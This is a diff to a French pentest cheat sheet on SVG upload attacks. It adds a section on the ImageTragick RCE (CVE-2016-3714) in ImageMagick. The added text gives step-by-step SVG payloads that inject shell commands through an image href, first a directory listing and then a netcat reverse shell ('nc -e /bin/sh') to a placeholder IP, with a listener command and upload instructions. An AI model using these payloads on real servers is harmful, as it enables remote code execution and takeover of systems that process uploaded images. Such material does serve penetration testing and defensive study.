@@ -1,10 +1,12 @@
 # SVG
 
+<img src="logo_svg.png" title="" alt="" height="200">
+
 **Facteur de risque** : XSS, XXE, HTML Injection, ,OpenRedirect, SSRF, DoS
 
-**Extensions** : .svg, .svgz
+**Extensions** : `.svg`, `.svgz`
 
-**Type MIME** : image/svg+xml
+**Type MIME** : `image/svg+xml`
 
 **Description** : Le **Scalable Vector Graphics** ou **SVG**, est un format de données conçu pour décrire des ensembles de graphiques vectoriels et basé sur XML. Exemple :
 
@@ -205,6 +207,67 @@ A regarder
 - https://twitter.com/ArbazKiraak/status/1100596327061188609?s=19&fbclid=IwAR32yGcg8v4AHSOJFWvJdyA-D5W29zOtV26cTPHFnoJQ_i3ul0Vyho_ntP0
 
 - https://gowsundar.gitbook.io/book-of-bugbounty-tips/ssrf
+
+## RCE : ImageTragick CVE-2016–3714
+
+<img src="logo_imagetragick.png" title="" alt="" height="200">
+
+**ImageMagick** est un logiciel utilisé pour créer, modifier (redimensionner), convertir ou afficher des fichiers d'images dans un très grand nombre de formats.
+
+ImageMagick possède plusieurs failles, donc une qui permet d'exécuter du code arbitraire à distance : https://imagetragick.com
+
+### Pré-requis
+
+- ImageMagick <= 6.9.3-9 est utilisé par le serveur web
+
+### Exploitation
+
+1. Copier le code suivant, qui permet de lister le répertoire (**ls.svg**):
+   
+   ```svg
+   <?xml version="1.0" standalone="no"?>
+   <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+   "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
+   <svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink="http://www.w3.org/1999/xlink";>
+   <image xlink:href="https://example.com/image.jpg"|ls "-la" x="0" y="0" height="640px" width="480px"/>
+   </svg>
+   ```
+   
+    Ici on injecte le code `";|ls "-la` pour lister le répertoire.
+
+2. Téléverser ce fichier sur l'application.
+
+Comme l'exploitation se passe au moment du téléversement, l'utilisateur peut ne pas voir pas le résultat des commandes. Mais un **reverse shell** est possible !
+
+1. Copier le code suivant :
+   
+   ```svg
+   <?xml version="1.0" standalone="no"?>
+   <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+   "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
+   <svg width="640px" height="480px" version="1.1"
+   xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=
+   "http://www.w3.org/1999/xlink";>
+   <image xlink:href="https://example.com/image.jpg"|nc -e /bin/sh IP_ADDRESS "PORT" x="0" y="0" height="640px" width="480px"/>
+   </svg>
+   ```
+   
+   LIci, on injecte le code `";|nc -e /bin/sh IP_ADDRESS_HERE "PORT_HERE` pour avoir un reverse shell.
+
+2. Remplacer `IP_ADRESS` et `PORT` dans le code (faire attention aux guillemets présents), puis enregistrer sous forme d'image (**nc.svg**). Par exemple :
+   
+   ```svg
+   <image xlink:href="https://example.com/image.jpg"|nc -e /bin/sh 127.0.0.1 "1234" x="0" y="0" height="640px" width="480px"/>
+   ```
+
+3. Écouter votre port :
+   
+   ```shell
+   nc -lnvp 1234
+   ```
+
+4. Téléverser ce fichier sur l'application. 
+   Au moment du téléversement, ImageMagick va traiter l'image, et exécuter en le code.
 
 ## Denial of Service : Billion Laughs
 
